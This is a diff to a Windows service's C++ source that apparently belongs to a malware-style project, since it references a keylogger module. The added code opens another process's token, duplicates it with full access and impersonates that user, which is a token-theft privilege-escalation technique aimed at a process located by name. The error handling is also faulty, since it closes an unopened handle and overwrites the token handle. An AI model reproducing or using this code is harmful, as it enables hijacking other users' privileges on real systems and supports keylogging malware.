@@ -1,6 +1,6 @@
 #include "svc.hpp"
-#include "../keylog/keylogger.h"
-#include <tlhelp32.h>
+
+
 
 
 DWORD FindTargetPID(const wchar_t* targetName)
@@ -324,7 +324,28 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 		wprintf(_T("OpenProcess failed (%lu)\n"), GetLastError());
 		return 1;
 	}
-
+    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &htoken))
+    {
+        _tprintf(_T("OpenProcessToken failed (%lu)\n"), GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(htoken);
+        return ERROR_PROCESS_ABORTED;
+    }
+    if (!DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &htoken))
+    {
+        _tprintf(_T("DuplicateTokenEx failed (%lu)\n"), GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(htoken);
+        return ERROR_PROCESS_ABORTED;
+    }
+    if (!ImpersonateLoggedOnUser(htoken))
+    {
+        _tprintf(_T("ImpersonateLoggedOnUser failed (%lu)\n"), GetLastError());
+        CloseHandle(hProcess);
+        CloseHandle(htoken);
+        return ERROR_PROCESS_ABORTED;
+    }
+    
 
 
     // Obtenir le répertoire du service
